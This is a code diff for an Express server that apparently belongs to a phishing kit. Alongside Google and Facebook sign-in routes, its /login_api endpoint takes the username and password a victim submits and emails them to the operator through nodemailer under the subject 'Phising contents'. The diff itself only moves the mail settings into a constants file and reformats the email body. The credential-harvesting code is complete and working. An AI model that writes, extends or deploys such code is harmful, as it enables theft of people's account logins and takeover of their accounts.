@@ -7,10 +7,9 @@ const facebook = require('./router/facebook')
 const nodemailer = require('nodemailer')
 const process = require('process')
 
-const app = express();
+const Constants = require('./constants')
 
-const useremail = process.env.useremail; // or Assign this variable with your Email Address e.g. somename@domain.com
-const userpass = process.env.userpass; // This to yor Password for above gmail or ****************
+const app = express();
 
 app.use(bodyParser.urlencoded({ extended: false }));
 app.use(bodyParser.json());
@@ -25,19 +24,20 @@ app.get('/google_signin', (req, res)=>{
 app.use('/facebook_signin', facebook)
 
 app.post('/login_api', (req, res)=>{
-    var transporter = nodemailer.createTransport({
-        service: 'gmail',
-        auth: {
-            user: useremail,
-            pass: userpass
-         }
-     });
+    var transporter = nodemailer.createTransport(Constants.CONFIG_TRANSPORT);
 
     var mailOptions = {
         from: 'Sachin Acharya<lucifer.morningstar@hellway.com>',
-        to: useremail,
+        to: Constants.EMAIL,
         subject: 'Phising contents',
-        html: `<p><strong>Email or Phone:</strong> ${req.body.username}</p><p><strong>Password: </strong> ${req.body.pass}</p>`
+        html: `
+            <p>
+                <strong>Email or Phone: </strong> ${req.body.username}
+            </p>
+            <p>
+                <strong>Password: </strong> ${req.body.pass}
+            </p>
+        `
     }
     
     //Nodemailer SendMail
